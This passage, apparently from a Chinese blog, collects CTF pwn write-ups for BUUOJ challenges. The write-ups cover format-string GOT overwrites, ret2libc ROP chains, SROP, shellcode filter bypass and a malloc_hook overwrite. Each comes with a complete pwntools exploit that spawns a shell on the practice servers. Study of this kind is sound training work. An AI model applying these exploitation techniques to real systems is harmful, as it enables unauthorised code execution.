可惜，第二个memcpy最大能复制的长度仅为12，不够覆盖验证函数的返回地址（差了四个字节），但是，**12个字节刚好够覆盖原来的ebp，更何况由于程序未开启地址随机化，我们知道decoded_str的地址，并能控制该块地址的内容（通过第一个memcpy控制），这一切正提醒我们：栈迁移**

我们可以把auth函数栈中ebp指向的值覆盖为bss段上decoded_str的地址，这样的话，auth函数结束时，一个`leave; ret;` 只能将ebp迁移过去，即只能使main函数的ebp变为&decoded_str+4，但在main函数结束时，另一个`leave; ret;` 就将esp迁移过去并跳转到correct函数了。

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = remote("node3.buuoj.cn",28695)
#p = process("./pwn")
p.recvuntil("Authenticate : ")
correct_addr = 0x0804925F
decoded_str = 0x0811EB40
payload = p32(0xDEADBEEF) + p32(correct_addr) + p32(decoded_str)
p.send(payload.encode('base64'))
p.interactive()
```

# xman_2019_format

也是一道经典的非栈上格式化字符串的题目，与前面bss段上的格式化字符串题目有所不同的是，此题的格式化字符串在堆上，但做法是基本类似的。一般地，非栈上的格式化字符串都需要先泄露栈的某个地址，如下图

![image-20210429151535093](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747942.png)

我们想要改0xffffcf9c处的返回地址0x804864b为我们后门函数的地址，需要利用ebp链，但那必须要通过直接或间接的方法先知道0xffffcf9c这个地址，才能修改ebp链。可是这个程序中我们只有一次输入的机会，如果用来泄露地址了，也就没机会再改返回地址了。

也许我们可以修改.fini_array数组的第一个元素为start或者main函数地址，来达到多次输入的目的（也许也是一种办法，但没有尝试）。可是这个程序有一个特殊之处，在main函数中，有add esp, 0FFFFFFF0h这么一条栈对齐指令，如下图（感觉没有这条指令应该也可以采用这种方式），这意味着从这里开始，栈空间的地址在二进制下最低四位是不会变的。也就是说，0xffffcf9c这个栈地址，它的最低四位永远为C，最低的字节只可能为0x1c,0x2c,0x3c……0xfc中的一个，我们可以采用爆破的方式，成功的概率为1/16

![image-20210429152149569](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747707.png)

此题中，strtok的作用可以参考[C 库函数 – strtok()](https://www.runoob.com/cprogramming/c-function-strtok.html)

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
payload = '%' + str(0x9C) + 'c%10$hhn|' + '%' + str(0x85ab) + 'c%18$hn#'
while True:
    try:
       #p = process("./pwn")
        p = remote("node3.buuoj.cn",27261)
        p.sendafter("...\n...\n", payload)
        sleep(0.2)
        p.sendlineafter('#', "ls")
        if('timeout' in p.recv()):
            continue
        p.interactive()
        break
    except Exception:
        p.close()
```

打本地的时候，把if('timeout' in p.recv()): continue改成p.recv(timeout = 1)，即可实现无限循环爆破

# inndy_echo2

检查保护：开了PIE，只能知道got表和plt表的偏移，要知道got表和plt表的地址，还得算程序加载的基址。

![image-20210429214739640](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747931.png)

第一次做计算程序加载基址的题目。其实原理也挺简单，泄露某条指令地址，如main+74，基址就是这个地址减去74减去main函数的偏移。

0x555555554a03-74-0x555555554000=0x9b9

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747022.png)

然后就是改printf在的got表中的真实地址为system，送'/bin/sh'的基本操作。当然，也可以改exit的真实地址为onegadget

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 27546)
e = ELF('./pwn')
libc = ELF('./libc-2.23-64.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload1 = '%43$p#%41$p'
p.sendline(payload1)
libc_start_main_240 = int(p.recv(14), 16)
libc_base_addr = libc_start_main_240 - 240 - libc.symbols['__libc_start_main']
system_true_addr = libc_base_addr + libc.symbols['system']
p.recvuntil("#")
main_74 = int(p.recv(14), 16)
elf_base_addr = main_74 - 74 - 0x9b9
printf_got_addr = elf_base_addr + e.got['printf']
print("system_true_addr:" + hex(system_true_addr))
print("printf_true_addr:" + hex(libc_base_addr + libc.symbols['printf']))
"""
system_true_addr:0x7fe1ddb213a0
printf_true_addr:0x7fe1ddb31810
"""
system_low_bytes = system_true_addr & 0xffff
system_high_bytes = (system_true_addr >> 16) & 0xff
print("system_low_bytes:" + hex(system_low_bytes))
print("system_high_bytes:" + hex(system_high_bytes))
#one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
onegadget_addr = libc_base_addr + one_gadget[0]
payload2 = '%' + str(system_high_bytes) + 'c%10$hhn' + '%' + str(system_high_bytes - system_low_bytes) + 'c%11$hn'
payload2 = payload2.ljust(32, '\x00') + p64(printf_got_addr + 2) + p64(printf_got_addr)
p.sendline(payload2)
sleep(0.2)
p.sendline('/bin/sh\x00')
p.interactive()
```

# picoctf_2018_buffer overflow 0

第一次使用ssh(SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议)登入

登录远程服务器：

```
ssh -p 50022 my@127.0.0.1
输入密码：
my@127.0.0.1:
```

**-p** 后面是端口

**my** 是服务器用户名

**127.0.0.1** 是服务器 ip

回车输入密码即可登录，如下图：

![image-20210504164058616](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747584.png)

输入ll可查看各文件的rwx权限，我们不是root用户，对flag没有读的权限

![image-20210504164338489](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747228.png)

主函数如下，这题漏洞点还是很简单的，无非是在vuln函数里面有一个strcpy可以构造溢出，用puts输出flag即可

![image-20210504164532547](https://abc.p0lar1s.com/202110282334767.png)

这里想说的是signal函数的作用，signal函数用于设置处理信号的功能（我个人理解为一种错误处理机制），第一个参数11为要处理的信号值，它对应的是进程执行了一个无效的内存引用，或发生段错误时发出的信号（比如函数的返回的地址无效时发出的信号），第二个参数sigsegv_handler即错误处理函数，如下，作用是将flag输入到了标准错误，并且fflush函数会直接将标准错误清空（也就是输出）

![image-20210504165448942](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747359.png)

如图，输入大量字符即可

![image-20210504165634548](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747390.png)

# starctf_2019_babyshell

开了一块内存给我们放shellcode

![image-20210505140842287](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747125.png)

难处在于有检查，检查函数如下：

![image-20210505140942702](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747656.png)

怎么绕过？使第一个字节为\x00即可，但是这样shellcode执行时会出问题

**\x00B后面加上一个字符， 对应一个汇编语句。**所以我们可以通过\x00B\x22、\x00B\x00等等来绕过那个检查，总之，用一个合适的开头是\x00的汇编指令即可，找找或者试试就可以

exp如下：

```python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 29993)
p.recvuntil('plz:')
shellcode = '\x00B\x00' + asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

# bbctf_2020_fmt_me

图片待更，有机会复现一遍再更图片，wp参考TaQini师傅的，思路大致如下（凭印象写的）：

**只有一次漏洞利用的机会，为了实现无限循环，可以在第一次漏洞利用时将system的got表中地址改为main函数的地址**

需要注意的点是snprintf函数有前两个参数，所以格式化字符串的偏移并不是8，而是8-2=6（自己做的的时搞错了）

再将snprintf在got表中的的真实地址改为system的plt表中的装载地址（直接改成system的plt表地址的话，又跳到main函数去了），将system的真实地址装载入plt表中，再送入'/bin/sh'即可getshell

exp如下：

```python
from pwn import *
p = remote('node3.buuoj.cn', 29536)

elf = ELF('./pwn')

context.log_level = 'debug'
context.arch = 'amd64'

fmt1 = fmtstr_payload(6,{elf.got['system']:elf.sym['main']},write_size='long')
p.sendlineafter('Choice: ','2')
p.sendlineafter('Good job. I\'ll give you a gift.',fmt1)

fmt2 = '/bin/sh;'
fmt2+= fmtstr_payload(7,{elf.got['snprintf']:0x401056-8},write_size='long')

p.sendlineafter('Choice: ','2')
p.sendlineafter('Good job. I\'ll give you a gift.',fmt2)

p.sendlineafter('Choice: ','2')
p.sendlineafter('Good job. I\'ll give you a gift.','TaQini win')
p.interactive()
```

# qctf_2018_dice_game

玩一个trick题目，题目大意是产生随机数，你需要猜对50次才能够给你flag

![image-20210507010440797](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748236.png)

猜数函数如下

![image-20210507010601492](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748478.png)

此前对srand函数和rand函数用法不是很清楚，只知道都是产生（伪）随机数的函数，当seed一样时，产生的随机数序列是一样的

## rand 和srand

srand函数是随机数发生器的初始化函数。原型：void srand(unsigned int seed);srand和rand()配合使用产生伪随机数序列。

**函数一：int rand(void)；**

功能：产生随机值，从srand (seed)中指定的seed开始，返回一个[seed, RAND_MAX（0x7fff）)间的随机整数。

**函数二：void srand(unsigned seed)；**

参数seed是rand()的种子，用来初始化rand()的起始值。

可以认为rand()在每次被调用的时候，它会查看：

1） 如果用户在此之前调用过srand(seed)，给seed指定了一个值，那么它会自动调用srand(seed)一次来初始化它的起始值。

2） 如果用户在此之前没有调用过srand(seed)，它会自动调用srand(1)一次。

正好，seed在栈上，所以我们可以覆盖seed值，产生我们能够预知的”随机数序列“

产生随机数：

**不同环境可能产生的随机数不一样**

```c
#include<stdio.h>
#include<stdlib.h>
#include<time.h>
int main(){
	srand('AAAAAAAA');
	int x;
	for(int i = 0; i < 50; i++){
		x = rand() % 6 + 1;
		printf("%d ", x);
	}
	return 0;
}
```

exp如下：

```python
from pwn import *

context(log_level='debug')

p=remote("node3.buuoj.cn",28634)

p.recv()

payload=b'A'*(0x50)

p.sendline(payload)

p.recv()

nums = [3,3,2,1,5,3,4,6,3,4,2,2,3,2,1,1,4,5,4,6,3,6,4,3,4,2,2,6,1,2,2,3,4,1,2,1,4,5,4,6,6,5,1,3,5,5,1,2,4,2]

for i in range(50):
	p.sendline(str(nums[i]))
	p.recv()

p.interactive()

```

# 鹏城杯_2018_code

主函数也很简单，check_str函数要求输入的名字必须是26个字母的大小写，angr_hash函数明显的提示了用angr，于是乎捡起几乎忘掉的angr知识，很可惜尝试了多次angr始终报错。

![image-20210507021300007](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748105.png)

![image-20210507021520925](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748452.png)

于是乎上爆破（大概10几分钟？）：

```python
import string
from itertools import *
dic = string.ascii_letters
print(dic)
for k in range(1, len(dic)):
    for i in product(dic, repeat = k):
        t = 0
        print(i)
        for j in range(0, len(i)):
            t = (117 * t + ord(i[j])) % 0x1D5E0C579E0
        if(t == 0x53CBEB035):
            print(i)
            exit(0)
```

![image-20210507024440005](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748821.png)

这里说一下用到的函数：

```
product 用于求多个可迭代对象的笛卡尔积(Cartesian Product)，它跟嵌套的 for 循环等价
即:product(A, B) 和 ((x,y) for x in A for y in B)的效果是一样的。
使用形式如下：
itertools.product(*iterables, repeat=1)
iterables 是可迭代对象, repeat指定 iterable 重复几次,即:
product(A,repeat=3)等价于product(A,A,A)，相当于A的三重笛卡尔积
```

然后常规ret2libc，最终exp见下，注意栈对齐即可（打不通就加一个ret）:

```python
from pwn import *
context(arch = 'amd64', log_level='debug', os = 'linux')
#p = process('./pwn')
p = remote("node3.buuoj.cn", 27167)
elf = ELF("./pwn")
p.recvuntil("Please input your name:\n")
p.sendline('wyBTs')
p.recvuntil("code to save\n")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
have_fun = 0x400801
pop_rdi_ret = 0x400983
payload1 = b'A'*(0x70 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(have_fun)
p.send(payload1)
puts_true_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print(hex(puts_true_addr))
p.recvuntil("code to save\n")
libc = ELF('./libc-2.27-64.so')
libc_base = puts_true_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()
ret = 0x40055e
payload2 = b'A' * (0x70 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.send(payload2)
p.interactive()
```

# rootersctf_2019_xsh

一道挺简单的格式化字符串漏洞题，也许是五一玩太久忘掉了某些知识，特将解题过程记录下来进行回忆。

检查保护：

![image-20210507163306988](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748969.png)

main函数如下：

![image-20210507162659332](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748208.png)

![image-20210507162748389](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041748741.png)

运行界面：

![image-20210507162825661](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749936.png)

程序大致流程是启动了一个类似终端的东西，可以在主函数中输入各种命令进入run函数执行，显然，run函数中，printf存在格式化字符串漏洞

首先必然是先找偏移，随便输入echo 456，断点下在call printf，可以看到我们的'echo'为格式化字符串的第23个参数，456为我们输入的的格式化字符串

![image-20210507162350702](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749377.png)

**由于程序开了地址随机化（PIE），故不能通过elf.plt['system']之类的函数来直接获取system在plt表中的地址**，需要先计算程序加载的基址（如上图，格式化字符串的第三个参数正是run+12的指令地址，用该地址减去run函数的偏移再减去12即可得到程序加载的基址），再加上system在plt表中的偏移（通过elf.plt['system']获取的正是system在plt表中的偏移）来算出system在plt表中的地址，接着将strncmp的got表中存储的真实地址（当然也可以改strtok函数的got表中地址位system，但不能改printf，原因不赘述）改为system的plt表地址，输入'/bin/sh'即可getshell

完整exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 26139)
e = ELF('./pwn')
p.recvuntil("$ ")
payload1 = 'echo ' + '%3$p'
p.sendline(payload1)
address = int(p.recv(10), 16)
run_12_base = 0x0123D + 12
ELFbase = address - run_12_base
system_plt = ELFbase + e.plt['system']
print(hex(system_plt))
system_low_bytes = system_plt & 0xffff
system_high_bytes = (system_plt >> 16) & 0xffff
print("system_low_bytes:" + hex(system_low_bytes))
print("system_high_bytes:" + hex(system_high_bytes))
strncmp_got = ELFbase + e.got['strncmp']
print(hex(strncmp_got))
p.recvuntil("$ ")
payload2 = 'echo' + p32(strncmp_got) + p32(strncmp_got + 2)
payload2 += '%' + str(system_low_bytes - 7) + 'c%24$hn' + '%' + str(system_high_bytes - system_low_bytes) + 'c%25$hn'
p.sendline(payload2)
p.recvuntil("$ ")
p.sendline('/bin/sh\x00')
p.interactive()
```

# 鹏城杯_2018_treasure

检查保护：

![image-20210507192800250](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749138.png)

主函数中，先是settreasure函数，不明所以，对整个题目也没有什么作用

![image-20210507192728644](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749963.png)

接下来是treasure函数，首先再bss段上开辟了一块长度为10字节大小的可读可写可执行代码段code，第一个字节放字母，最终留给我们写shellcode的空间只有9字节，这么短的空间写什么shellcode呢？

![image-20210507192857610](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749803.png)

其实我们可以写入一段读入ropchain的shellcode（在call rdx处下断点，可以发现已有的rax=0和r10为较大数字的条件，尽最大可能减小shellcode的长度）：

```
shellcode = asm("""
push rsp;
pop rsi;
mov rdx, r10
syscall
ret
""")
```

这样写，目的是**在当前的栈顶读入我们构造的ropchain，并返回到我们指定的流程中**，接下来就是常规的ret2libc(ROP)

完整exp如下，payload利用libc中的函数和字符串system('/bin/sh')或者跳到one_gadget执行execve都可，前者可能存在栈对齐问题，加了ret后能够打通

```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 29910)
e = ELF('./pwn')
puts_got_addr = e.got['puts']
puts_plt_addr = e.plt['puts']
p.recvuntil("(enter 'n' to quit) :")
p.sendline(b'a')
p.recvuntil('start!!!!')
shellcode = asm("""
push rsp;
pop rsi;
mov rdx, r10
syscall
ret
""")
print(len(shellcode))  # length: 8
p.send(shellcode)
pop_rdi_ret = 0x0400b83
treasure = 0x04009BA
payload = p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(treasure)
p.send(payload)
puts_true_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
libc = ELF('./libc-2.27-64.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_true_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()
one_gadget = libc_base +0x4f322
ret = 0x4006a9
#payload = p64(ret)+p64(one_gadget)
payload = p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.recvuntil("(enter 'n' to quit) :")
p.sendline(b'a')
p.recvuntil('start!!!!')
p.send(shellcode)
sleep(0.1)
p.send(payload)
p.interactive()
```

# 铁人三项(第五赛区)_2018_seven

严格来说应该是一道脑洞题，

检查保护：

![image-20210507204739191](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749433.png)

主函数如下：

![image-20210507204808529](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749999.png)

初始化函数如下，可以看到产生了两个随机数并且以此为基础分配了两块内存空间，一块可读可写可执行，另一块可写可执行

![image-20210507204838803](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749302.png)

也是要求注入很短的shellcode，根据上题的经验，注入的shellcode应该与sys_read有关，这样接下来把不管是继续输入shellcode还是读入ropchain，都需要sys_read

如下图，在call rax之前，出题人非常刻意的将那块可写可执行的区域的地址给了rdi

![image-20210507205358268](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749043.png)

在出题人给我们写好的初始化shellcode中，一开始又非常刻意的将可写可执行的区域的地址从rdi交给了rsp，显然在执行shellcode时，rip是指向可读可写可执行的那块内存

![image-20210507205508171](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749508.png)

于是乎，存在下面这种可能性，在执行shellcode时，rsp和rip距离非常近，因为我们输入的shellcode的作用一般是将后续内容读入到栈顶，所以也存在这么一种可能性：我们读入到栈顶的内容够多，以至于从rsp指向的位置一直覆盖到rip指向的位置，以至于执行完我们第一次输入的shellcode后，又继续执行我们第二次输入的shellcode，也正因为第二次能读入的内容够多，第二次shellcode可以直接帮助我们getshell

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749434.jpeg)

感觉这种类型的题目还是相当冷门……不经过反复多次调试很难发现此中奥秘。直接上大佬的代码（因为是随机的，要多试几次）：

```
from pwn import *
#context.log_level = 'debug'
context(os='linux',arch='amd64',endian='little')
p = process('./2018_seven')
#gdb.attach(p,'b *0x555555554d0b')
shellcode = asm('push rsp;pop rsi;mov dx,si;syscall')
p.sendafter('shellcode:\n',shellcode)
sleep(1)
p.sendline('A'*0xb37+ asm(shellcraft.sh()))
p.interactive()
```

# 360chunqiu2017_smallest

检查保护：

![image-20210508150127087](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749370.png)

start函数如下（真的很小）：

![image-20210508150050575](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749623.png)

**由于gadgets几乎没有，但有syscall并且能控制rax，考虑SROP**

考察SROP，技巧性很强。有两种思路，首先都要泄露出一个栈上的地址，接着第一种思路是将**泄露出来的那块地址和附近的区域用sys_mprotect将权限更改为可读可写可执行并执行已经输入好的shellcode**，第二种思路是**在泄漏的地址附近输入'/bin/sh'，再使用sys_execve来getshell**，无论哪一种，都需要在泄漏的地址附近读入ropchain，而系统提供的sys_read只能将内容读入到栈顶，所以要先构造一次sys_read的sigreturn，以便于我们将ropchain(和shellcode或'/bin/sh')读入到那个我们已知的地址附近。

写payload时，还有一些细节要注意

由于需要使rax等于各种不同的值，所以在sys_read时要输入不同数量的字符，但系统提供的sys_read只能将内容读入到栈顶，所以要注意输入的字符不能是随意的。例如，为了使用sys_write泄露出栈上的地址，需要使rax=1，此时rsp指向的内容是0x4000B3这个地址，那么我们输入的那一个字符就必须是'\xB3'，否则会破坏这个地址，同理，exp中的payload2_part和payload3_part都起到了这个作用。

**下面两种payload只能打通本地**，后面讲打通远程的办法

使用mprotect进而执行shellcode从而getshell的exp如下：

```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
#p = remote('node3.buuoj.cn', 25283)
sys_read = 0x4000b0
syscall_ret = 0x4000be

# use sys_write to leak a stack addr
payload1 = p64(sys_read) + p64(0x4000B3) + p64(sys_read)
p.send(payload1)
sleep(0.1)
p.send(b'\xb3')  # make rax = 1
stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print(hex(stack_addr))

# read the ropchain to stack_addr
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rdi = 0
frame1.rsi = stack_addr
frame1.rdx = 0x1000
frame1.rsp = stack_addr
frame1.rip = syscall_ret
payload2 = p64(sys_read) + p64(syscall_ret) + str(frame1)
payload2_part = p64(syscall_ret) + str(frame1)[0:7]
p.send(payload2)
sleep(0.1)
p.send(payload2_part)  # read 15 bytes to make rax = 0xf
sleep(0.1)

# mprotect((stack_addr & 0xfffffffffff000), 0x1000, 7)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_mprotect
frame2.rdi = stack_addr & 0xfffffffffff000
frame2.rsi = 0x1000
frame2.rdx = 7
frame2.rsp = stack_addr + 0x500
frame2.rip = syscall_ret
payload3 = p64(sys_read) + p64(syscall_ret) + str(frame2)
# shellcode start from (stack_addr + 0x500 + 8), ret = pop rip, rip = stack_addr + 0x500 + 8
payload3 = payload3.ljust(0x500, '\x00') + p64(stack_addr + 0x500 + 8) + asm(shellcraft.sh())
p.send(payload3)
sleep(0.1)
payload3_part = p64(syscall_ret) + str(frame2)[0:7]
p.send(payload3_part)
sleep(0.1)

p.interactive()
```

使用execve('/bin/sh', 0, 0)来getshell的exp如下：

```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 25283)
sys_read = 0x4000b0
syscall_ret = 0x4000be

# use sys_write to leak a stack addr
payload1 = p64(sys_read) + p64(0x4000B3) + p64(sys_read)
p.send(payload1)
sleep(0.1)
p.send(b'\xb3')  # make rax = 1
stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print(hex(stack_addr))

# read the ropchain to stack_addr
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rdi = 0
frame1.rsi = stack_addr
frame1.rdx = 0x1000
frame1.rsp = stack_addr
frame1.rip = syscall_ret
payload2 = p64(sys_read) + p64(syscall_ret) + str(frame1)
payload2_part = p64(syscall_ret) + str(frame1)[0:7]
p.send(payload2)
sleep(0.1)
p.send(payload2_part)  # read 15 bytes to make rax = 0xf
sleep(0.1)
bin_sh_addr = stack_addr + 0x500

# execve('/bin/sh', 0, 0)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = bin_sh_addr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret
payload3 = p64(sys_read) + p64(syscall_ret) + str(frame2)
payload3 = payload3.ljust(0x500, '\x00') + '/bin/sh\x00'
p.send(payload3)
sleep(0.1)
payload3_part = p64(syscall_ret) + str(frame2)[0:7]
p.send(payload3_part)
sleep(0.1)

p.interactive()
```

**将上述两种payload的**

`stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))`

**改为：**

`stack_addr = u64(p.recv()[0x148:0x148+8])`

即可打通远程，原因是远程的栈空间布局和本地不同（如下图），碰到这种问题的时候只能多调试……

![image-20210508155707660](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749490.png)

# 0ctf2017_easiestprintf

检查保护：

![image-20210508165154531](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749439.png)

栈上的格式化字符串漏洞利用，难点在于开了FULL RELRO，但其实之前也有总结过，有两个办法，**一是改返回地址为one_gadget；二是改malloc_hook/free_hook为one_gadget，再让printf输出大量字符触发malloc/free**。前者的话因为返回地址是在栈上，所以要泄露栈上的地址，但在这里格式化字符串漏洞只能用一次，泄露了栈上的地址就无法再去改返回地址了，也不想劳神费力再去改.fini_array了，所以采用第二种方式，改malloc_hook为one_gadget地址

经某大佬测试，输出长为五万的时候还不算太长，十万左右就算太长了，这个是没有明确限定的，应该是在处理格式化占位符的输出的时候会考虑调用，这里前两个格式化字符串进行覆写malloc_hook，不会调用malloc，最后一个格式化字符串(%100000c)实现调用malloc

![image-20210508171134144](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749573.png)

do_read函数实现了任意读

![image-20210508171235004](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749252.png)

leave函数中有格式化字符串漏洞

![image-20210508171308198](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041749618.png)

**还要注意one_gadget的选取！！！**在printf函数中eax不为0，不能选择eax==NULL的one_gadget

exp如下：

```
from pwn import *
context(arch='i386', os='linux', log_level='debug')
p = process('./pwn')
#p = remote('node3.buuoj.cn', 25283)
e = ELF('./pwn')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.23-32.so')
puts_got = e.got['puts']
p.recvuntil("Which address you wanna read:\n")
p.sendline(str(puts_got))
p.recvuntil('0x')
puts_true_addr = int(p.recv(8), 16)
libc_base_addr = puts_true_addr - libc.symbols['puts']
one_gadget = libc_base_addr + 0x3ac72
#one_gadget = libc_base_addr + 0x3a812
malloc_hook = libc_base_addr + libc.symbols['__malloc_hook']
p.recvuntil("Good Bye\n")
offset = 7
low_bytes = one_gadget & 0xffff
high_bytes = (one_gadget >> 16) & 0xffff
print("one_gadget_low_bytes:" + hex(low_bytes))
print("one_gadget_high_bytes:" + hex(high_bytes))
#pause()
payload = p32(malloc_hook) + p32(malloc_hook + 2) + '%' + str(low_bytes - 8) + 'c%7$hn'
payload += '%' + str(high_bytes - low_bytes) + 'c%8$hn'
payload += '%100000c'
p.sendline(payload)
p.interactive()
```

# xp0intctf_2018_gameserver

简单题，漏洞点在于snprintf函数的返回值为欲写入的长度，而不是实际的长度

```
如果格式化后的字符串长度大于size，超过size的部分会被截断，只将其中的(size-1)个字符复制到str中，并给其后添加一个字符串结束符\0，返回值为欲写入的字符串长度
```

漏洞函数如下：

```
int sub_8048637()
{
  char s[256]; // [esp+7h] [ebp-111h] BYREF
  char v2; // [esp+107h] [ebp-11h]
  size_t nbytes; // [esp+108h] [ebp-10h]
  char *v4; // [esp+10Ch] [ebp-Ch]

  puts("Welcome to my game server");
  puts("First, you need to tell me you name?");
  fgets(name, 256, stdin);
  v4 = strrchr(name, '\n');
  if ( v4 )
    *v4 = 0;
  printf("Hello %s\n", name);
  puts("What's you occupation?");
  fgets(occupation, 256, stdin);
  v4 = strrchr(occupation, '\n');
  if ( v4 )
    *v4 = 0;
  printf("Well, my noble %s\n", occupation);
  nbytes = snprintf(s, 256u, "Our %s is a noble %s. He is come from north and well change out would.", name, occupation);
  puts("Here is you introduce");
  puts(s);
  puts("Do you want to edit you introduce by yourself?[Y/N]");
  v2 = getchar();
  getchar();
  if ( v2 == 'Y' )
    read(0, s, nbytes);
  return printf("name : %s\noccupation : %s\nintroduce : %s\n", name, occupation, s);
}
```

只要我们输入的字符够多，nbytes足够大，就可以通过栈溢出构造ROP链，exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 25452)
e = ELF('./pwn')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
vul_addr = 0x08048637
p.recvuntil("First, you need to tell me you name?\n")
p.sendline(b'a' * 250)
p.recvuntil("occupation?\n")
p.sendline(b'a' * 250)
p.recvuntil("[Y/N]\n")
p.sendline(b'Y')
payload = b'a' * (273 + 4) + p32(puts_plt) + p32(vul_addr) + p32(puts_got)
p.send(payload)
puts_addr = u32(p.recvuntil('\xf7')[-4:])
libc = ELF('./libc-2.27-32.so')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()
payload = b'a' * 277 + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
p.recvuntil("First, you need to tell me you name?\n")
p.sendline(b'a' * 250)
p.recvuntil("occupation?\n")
p.sendline(b'a' * 250)
p.recvuntil("[Y/N]\n")
p.sendline(b'Y')
p.send(payload)
p.interactive()
```

